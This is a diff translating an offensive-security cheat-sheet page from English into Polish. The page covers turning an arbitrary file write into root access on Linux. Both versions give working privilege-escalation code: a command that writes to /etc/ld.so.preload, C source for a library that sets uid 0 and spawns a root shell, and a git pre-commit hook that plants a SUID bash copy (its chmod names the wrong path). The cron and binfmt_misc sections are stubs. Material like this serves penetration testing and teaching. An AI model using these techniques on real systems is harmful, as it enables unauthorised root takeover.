@@ -1,40 +1,36 @@
-# Arbitrary File Write to Root
+# Dowolne zapisywanie plików do roota
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
-If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.
+Ten plik działa jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **binarnych plikach SUID**.\
+Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która będzie ładowana** z każdym wykonywanym plikiem binarnym.
 
-For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
-
+Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-    unlink("/etc/ld.so.preload");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+unlink("/etc/ld.so.preload");
+setgid(0);
+setuid(0);
+system("/bin/bash");
 }
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** przy różnych **zdarzeniach** w repozytorium git, takich jak tworzenie commita, scalanie... Jeśli więc **skrypt z uprawnieniami lub użytkownik** wykonuje te działania często i możliwe jest **zapisywanie w folderze `.git`**, można to wykorzystać do **privesc**.
 
-For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
-
+Na przykład, możliwe jest **generowanie skryptu** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany, gdy tworzony jest nowy commit:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-
 ### Cron & Time files
 
 TODO
@@ -45,6 +41,6 @@ TODO
 
 ### binfmt_misc
 
-The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który plik binarny powinien wykonywać jaki typ plików. TODO: sprawdź wymagania, aby wykorzystać to do uruchomienia rev shell, gdy otwarty jest typ pliku. 
 
 {{#include ../../banners/hacktricks-training.md}}
